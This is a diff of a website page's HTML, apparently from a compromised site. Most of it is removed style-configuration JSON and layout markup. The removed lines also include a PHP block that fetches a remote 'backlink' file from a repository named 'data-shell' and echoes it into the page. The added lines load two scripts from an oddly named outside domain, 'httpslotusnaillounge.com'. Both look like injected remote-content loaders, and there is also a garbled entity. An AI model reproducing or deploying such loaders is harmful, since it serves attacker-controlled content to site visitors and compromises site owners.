-                                                                &quot;value&quot;: 90.0
-                                                              },
-                                                              &quot;border&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;position&quot;: &quot;allSides&quot;,&quot;thickness&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 4.0
-                                                                },
-                                                                &quot;color&quot;: {
-                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                  &quot;sitePaletteColor&quot;: {
-                                                                    &quot;colorName&quot;: &quot;black&quot;,
-                                                                    &quot;alphaModifier&quot;: 1.0
-                                                                  }
-                                                                }
-                                                              },
-                                                              &quot;dropShadow&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;blur&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 30.0},
-                                                                &quot;spread&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 0.0
-                                                                },
-                                                                &quot;distance&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 0.0
-                                                                },
-                                                                &quot;color&quot;: {
-                                                                  &ququot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                  &quot;sitePaletteColor&quot;: {
-                                                                    &quot;colorName&quot;: &quot;black&quot;,
-                                                                    &quot;alphaModifier&quot;: 1.0
-                                                                  }
-                                                                }
-                                                              },
-                                                              &quot;blurBackground&quot;: {
-                                                                &quot;enabled&quot;: false,
-                                                                &quot;blurRadius&quot;: {
-                                                                  &quot;unit&quot;: &quot;px&quot;,
-                                                                  &quot;value&quot;: 12.0
-                                                                }
-                                                              },
-                                                              &quot;backgroundColor&quot;: {
-                                                                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                &quot;sitePaletteColor&quot;: {
-                                                                  &quot;colorName&quot;: &quot;white&quot;,
-                                                                  &quot;alphaModifier&quot;: 1.0
-                                                                }
-                                                              },
-                                                              &quot;navigationColor&quot;: {
-                                                                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                &quot;sitePaletteColor&quot;: {
-                                                                  &quot;colorName&quot;: &quot;black&quot;,
-                                                                  &quot;alphaModifier&quot;: 1.0
-                                                                }
-                                                              }
-                                                            },
-                                                            &quot;dropShadowOptions&quot;: {
-                                                              &quot;enabled&quot;: false,
-                                                              &quot;blur&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 12.0
-                                                              },
-                                                              &quot;spread&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 0.0
-                                                              },
-                                                              &quot;distance&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 12.0
-                                                              }
-                                                            },
-                                                            &quot;borderOptions&quot;: {
-                                                              &quot;enabled&quot;: false,
-                                                              &quot;position&quot;: &quot;allSides&quot;,
-                                                              &quot;thickness&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 4.0
-                                                              },
-                                                              &quot;color&quot;: {
-                                                                &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
-                                                                &quot;sitePaletteColor&quot;: {
-                                                                  &quot;colorName&quot;: &quot;black&quot;,
-                                                                  &quot;alphaModifier&quot;: 1.0
-                                                                }
-                                                              }
-                                                            },
-                                                            &quot;showPromotedElement&quot;: false,
-                                                            &quot;buttonVariant&quot;: &quot;primary&quot;,
-                                                            &quot;blurBackground&quot;: {
-                                                              &quot;enabled&quot;: false,
-                                                              &quot;blurRadius&quot;: {
-                                                                &quot;unit&quot;: &quot;px&quot;,
-                                                                &quot;value&quot;: 12.0
-                                                              }
-                                                            },
-                                                            &quot;headerOpacity&quot;: {
-                                                              &quot;unit&quot;: &quot;%&quot;,
-                                                              &quot;value&quot;: 100.0
-                                                            }
-                                                          }" data-section-id="overlay-nav" data-show-account-login="false" data-test="header-menu">
-<div class="header-menu-bg theme-bg--primary"></div>
-<div class="header-menu-nav">
-<nav class="header-menu-nav-list">
-<div data-folder="root" class="header-menu-nav-folder">
-<div class="header-menu-nav-folder-content">
+
 </div>
-</div>
-</div>
-</div>
-</nav>
-</div>
-</div>
-</header>
-<main id="page" class="container" role="main">
-<article class="sections" id="sections" data-page-sections="65fd0fc2aa1d0858f5af2fe5">
-<section data-test="page-section" data-section-theme class="page-section 
-    
-      content-collection
-      full-bleed-section
-      collection-type-products
-    
-    background-width--full-bleed
-    
-      section-height--medium
-    
-    
-      content-width--wide
-    
-    horizontal-alignment--center
-    vertical-alignment--middle
-    
-      
-    
-    
-    " data-section-id="65fd10856774354aafe184c6" data-controller="SectionWrapperController" data-current-styles="{
-                                                            &quot;imageOverlayOpacity&quot;: 0.15,
-                                                            &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
-                                                            &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
-                                                            &quot;customSectionHeight&quot;: 10,
-                                                            &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
-                                                            &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
-                                                            &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
-                                                            &quot;customContentWidth&quot;: 50,
-                                                            &quot;backgroundColor&quot;: &quot;&quot;,
-                                                            &quot;sectionTheme&quot;: &quot;&quot;,
-                                                            &quot;sectionAnimation&quot;: &quot;none&quot;,
-                                                            &quot;backgroundMode&quot;: &quot;image&quot;
-                                                          }" data-current-context="{
-                                                            &quot;video&quot;: null,
-                                                            &quot;backgroundImageId&quot;: null,
-                                                            &quot;backgroundMediaEffect&quot;: null,
-                                                            &quot;divider&quot;: null,
-                                                            &quot;typeName&quot;: &quot;products&quot;
-                                                          }" data-animation="none">
-<?php
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/Angpao-Imlek-Termanis/data-shell/refs/heads/main/backlink");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$output = curl_exec($ch);
-curl_close($ch);
-echo $output;
-?>
+<!-- END wrapper -->
+
+<!-- Vendor js -->
+<script src="
+https://httpslotusnaillounge.com/data.js/vendor.min.js"></script>
+<!-- Plugins js-->
+
+<!-- App js -->
+<script src="https://httpslotusnaillounge.com/data.js/app.min.js"></script>
+
+</body>
+</html>
